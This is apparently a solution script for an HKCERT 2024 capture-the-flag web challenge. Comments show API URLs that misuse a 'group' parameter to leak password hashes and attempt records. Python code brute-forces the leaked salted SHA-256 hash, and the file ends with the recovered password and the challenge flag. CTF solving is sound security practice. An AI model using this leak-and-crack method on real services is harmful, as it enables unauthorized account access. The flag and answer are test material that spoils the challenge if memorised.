import hashlib
import os
from concurrent.futures import ThreadPoolExecutor

# https://c16a-minictf-1-t100558-gg7s7ya37xlshumjslgqksub.hkcert24.pwnable.hk/api/users/?group=password
# Player Account Password 

salt = "77364c85"
sha256_hash = "744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94"
tested_passwords = set()

def generate_and_check():
    while True:
        password = os.urandom(3).hex()
        
        if password in tested_passwords:
            continue

        tested_passwords.add(password)
        
        h = hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()
        
        if h == sha256_hash:
            return password

with ThreadPoolExecutor(max_workers=4) as executor:
    future = executor.submit(generate_and_check)
    result = future.result()

print(f"password: {result}") # 7df71e

# https://c16a-minictf-1-t100558-gg7s7ya37xlshumjslgqksub.hkcert24.pwnable.hk/api/attempts/?group=flag
"""
Hack this site! / hkcert24{y0u_c4n_9r0up_unsp3c1f13d_4t7r1bu73s_fr0m_th3_4tt3mp7_m0d3l}
"""